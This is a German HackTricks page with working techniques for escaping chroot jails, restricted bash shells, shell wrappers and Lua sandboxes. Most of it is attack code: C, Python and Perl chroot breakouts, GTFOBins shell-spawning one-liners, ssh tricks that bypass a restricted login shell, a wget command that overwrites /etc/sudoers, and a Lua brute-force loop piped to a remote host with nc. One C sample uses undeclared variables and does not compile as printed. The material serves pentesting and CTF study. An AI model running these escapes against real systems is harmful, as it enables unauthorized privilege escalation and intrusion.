# Aus Jails ausbrechen

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Suche auf** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **danach, ob du irgendeine Binary mit der Eigenschaft "Shell" ausführen kannst**

## Chroot Escapes

Aus [Wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Der chroot-Mechanismus ist **nicht dazu vorgesehen, sich gegen absichtliche Manipulation** durch **privilegierte** (**root**) **Benutzer zu schützen**. Auf den meisten Systemen lassen sich chroot-Kontexte nicht ordnungsgemäß verschachteln, und chrooted-Programme **mit ausreichenden Privilegien können einen zweiten chroot ausführen, um auszubrechen**.\
Normalerweise bedeutet das, dass du root innerhalb des chroot benötigst, um auszubrechen.<sup>[[4]](#references)</sup>

> [!TIP]
> Das **Tool** [**chw00t**](https://github.com/earthquake/chw00t) wurde erstellt, um die folgenden Szenarien auszunutzen und aus `chroot` auszubrechen.<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> Wenn du **root** innerhalb eines chroot bist, **kannst du ausbrechen**, indem du **einen weiteren chroot** erstellst. Das liegt daran, dass 2 chroots (unter Linux) nicht koexistieren können. Wenn du also einen Ordner erstellst und anschließend **einen neuen chroot** in diesem neuen Ordner erstellst, während **du dich außerhalb davon** befindest, bist du nun **außerhalb des neuen chroot** und befindest dich daher im FS.
>
> Das geschieht, weil chroot dein Arbeitsverzeichnis normalerweise NICHT in das angegebene Verzeichnis verschiebt. Du kannst also einen chroot erstellen, dich aber weiterhin außerhalb davon befinden.<sup>[[4]](#references)[[5]](#references)</sup>

Normalerweise wirst du die `chroot`-Binary innerhalb eines chroot jail nicht finden, aber du **könntest eine Binary kompilieren, hochladen und ausführen**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Dies ähnelt dem vorherigen Fall, aber in diesem Fall **speichert der Angreifer einen file descriptor für das aktuelle Verzeichnis** und erstellt dann den **chroot in einem neuen Ordner**. Da er schließlich **außerhalb** des chroot **Zugriff** auf diese **FD** hat, greift er darauf zu und **entkommt**.<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD kann über Unix Domain Sockets übergeben werden, daher:
>
> - Einen Child-Prozess erstellen (fork)
> - UDS erstellen, damit Parent und Child miteinander kommunizieren können
> - chroot im Child-Prozess in einen anderen Ordner ausführen
> - Im Parent-Prozess einen FD eines Ordners erstellen, der außerhalb des neuen chroot des Child-Prozesses liegt
> - Diesen FD mithilfe des UDS an den Child-Prozess übergeben
> - Der Child-Prozess führt chdir zu diesem FD aus. Da dieser außerhalb seines chroot liegt, kann er aus dem Jail entkommen.<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - Das Root-Gerät (/) in ein Verzeichnis innerhalb des chroot mounten
> - In dieses Verzeichnis chrooten
>
> Dies ist unter Linux möglich.<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - procfs in ein Verzeichnis innerhalb des chroot mounten (falls noch nicht geschehen)
> - Nach einer PID suchen, die einen anderen root/cwd-Eintrag hat, zum Beispiel: /proc/1/root
> - In diesen Eintrag chrooten.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - Einen Fork (Child-Prozess) erstellen, in einen anderen, tiefer im FS gelegenen Ordner chrooten und dorthin mit CD wechseln
> - Vom Parent-Prozess aus den Ordner, in dem sich der Child-Prozess befindet, in einen Ordner vor dem chroot des Child-Prozesses verschieben
> - Dieser Child-Prozess befindet sich dadurch außerhalb des chroot.<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - Ob sich ein Prozess mit `ptrace` anhängen kann, hängt von Credentials, Capabilities und aktivierten Security-Modulen wie Yama ab; das Debugging durch Benutzer mit demselben Benutzerkonto kann daher durch die Systemrichtlinie eingeschränkt sein.<sup>[[8]](#references)</sup>
> - Wenn das Anhängen erlaubt ist, könntest du dich per ptrace in einen Prozess einklinken und darin einen Shellcode ausführen ([siehe dieses Beispiel](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Enumeration

Informationen über das Jail abrufen:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### PATH ändern

Prüfe, ob du die Umgebungsvariable PATH ändern kannst.<sup>[[2]](#references)</sup>
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Vim verwenden

Wenn Vim verfügbar ist, setzen Sie dessen Option `shell` auf eine Shell, die Sie ausführen können, und rufen Sie `:shell` auf.<sup>[[10]](#references)</sup>
```bash
:set shell=/bin/sh
:shell
```
### Pager und Hilfe-Viewer

In vielen eingeschränkten Umgebungen sind **Pager** oder **Hilfe-Viewer** weiterhin verfügbar. Diese lassen sich normalerweise schneller missbrauchen, als zu versuchen, `PATH` neu aufzubauen.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Wenn `git` verfügbar ist, sendet seine Option `--paginate` die Ausgabe an `less` oder `$PAGER`, was nützlich ist, wenn ein pager escape verfügbar ist.<sup>[[9]](#references)</sup>
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Häufige GTFOBins-Einzeiler

Sobald du weißt, welche Binaries erreichbar sind, teste zuerst die offensichtlichen Shell-Spawner:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Wenn du nur **Argumente in** einen erlaubten Befehl **einschleusen** kannst (anstatt ihn uneingeschränkt auszuführen), prüfe auch **GTFOArgs**.<sup>[[17]](#references)</sup>

### Script erstellen

Prüfe, ob du eine ausführbare Datei mit _/bin/bash_ als Inhalt erstellen kannst
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Bash über SSH abrufen

Wenn Sie über ssh zugreifen, können Sie den Server häufig auffordern, ein **anderes Programm** anstelle der eingeschränkten Login-Shell auszuführen.<sup>[[14]](#references)</sup>
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Wenn `ssh` zu den wenigen lokal erlaubten Binärdateien gehört, sollte man daran denken, dass es auch als **GTFOBin** missbraucht werden kann; seine Optionen `LocalCommand` und `ProxyCommand` führen lokal konfigurierte Hilfsbefehle aus.<sup>[[14]](#references)[[15]](#references)</sup>
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare

In Bash leitet ein nameref Zuweisungen an eine andere Variable weiter, während das Hinzufügen eines Elements zu `BASH_CMDS` diesen Befehl zur internen Befehlshash-Tabelle von Bash hinzufügt.<sup>[[11]](#references)[[12]](#references)</sup>
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Wgets Option `-O` schreibt heruntergeladene Inhalte in die angegebene Ausgabedatei; wenn dieser Pfad beschreibbar ist, kann dadurch eine Datei wie `/etc/sudoers` überschrieben werden.<sup>[[13]](#references)</sup>
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Einige Umgebungen setzen dich nicht in eine einfache `rbash`-Shell, sondern in **Wrapper** wie `git-shell`, `rssh` oder `lshell`:

- `git-shell` akzeptiert nur serverseitige Git-Befehle sowie alles, was sich innerhalb von `~/git-shell-commands/` befindet. Wenn dieses Verzeichnis existiert, führe `help` aus, um die erlaubten benutzerdefinierten Aktionen aufzulisten. Wenn du dort **Schreibrechte** hast, wird jede in diesem Verzeichnis abgelegte ausführbare Datei erreichbar.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` erlauben üblicherweise nur `scp`, `sftp`, `rsync` oder Git-ähnliche Vorgänge. Konzentriere dich in diesen Fällen zunächst auf **Dateischreibmöglichkeiten**: Lade `authorized_keys`, eine Shell-Startdatei oder ein Hilfsskript an einen beschreibbaren Ort hoch und verbinde dich anschließend mit `ssh -t ...` erneut.
- Wenn der Wrapper nur die Befehlszeile filtert, liste die erreichbaren Binaries auf und wechsle anschließend wieder zu **GTFOBins / GTFOArgs**.

### Weitere Tricks

Prüfe außerdem:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Auch diese Seite könnte interessant sein:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Tricks zum Escaping aus Python-Jails findest du auf der folgenden Seite:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Auf dieser Seite findest du die globalen Funktionen, auf die du innerhalb von Lua Zugriff hast: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base).<sup>[[16]](#references)</sup>

Die Standardfunktionen `load`, `string.char` und `os.execute` können diesen Chunk erstellen und ausführen, sofern sie verfügbar sind.<sup>[[16]](#references)</sup>
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Eine Tabellenfunktion kann auch mit `rawget` statt der Punkt-Syntax abgerufen werden.<sup>[[16]](#references)</sup>
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Verwende `pairs`, um eine Bibliothekstabelle aufzulisten.<sup>[[16]](#references)</sup>
```bash
for k,v in pairs(string) do print(k,v) end
```
Die Reihenfolge, in der `pairs` Tabellenindizes aufzählt, ist nicht festgelegt. Verlasse dich daher nicht darauf, dass eine bestimmte Funktion zuerst erscheint. Wenn du eine bestimmte Funktion ausführen musst, kannst du einen Brute-Force-Angriff durchführen, indem du verschiedene Lua-Umgebungen lädst und die erste Funktion der Bibliothek aufrufst.<sup>[[16]](#references)</sup>
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Interaktive lua-Shell erhalten**: Wenn du dich in einer eingeschränkten lua-Shell befindest, kannst du durch Aufrufen von `debug.debug()` eine neue lua-Shell (und hoffentlich eine uneingeschränkte) erhalten, wodurch ein interaktiver Modus gestartet wird.<sup>[[16]](#references)</sup>
```bash
debug.debug()
```
## References

- [1] [Chw00t: So bricht man aus verschiedenen Chroot-Lösungen aus (Bucsay Balazs, DeepSec-Vortrag und -Folien)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [GNU Bash-Referenzhandbuch – Die eingeschränkte Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Git-Dokumentation](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – chroot-Escape-Tool](https://github.com/earthquake/chw00t)
- [6] [unix(7) – Linux-Handbuchseite](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Git-Dokumentation](https://git-scm.com/docs/git)
- [10] [:shell – Vim-Dokumentation](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Bash-Builtins – GNU Bash-Referenzhandbuch](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Bash-Variablen – GNU Bash-Referenzhandbuch](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [GNU-Wget-Handbuch](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – OpenBSD-Handbuchseite](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – OpenBSD-Handbuchseite](https://man.openbsd.org/ssh_config)
- [16] [Lua-5.4-Referenzhandbuch](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs: Liste der Argument-Injection-Exploitation-Vektoren](https://gtfoargs.github.io/)
{{#include ../../banners/hacktricks-training.md}}
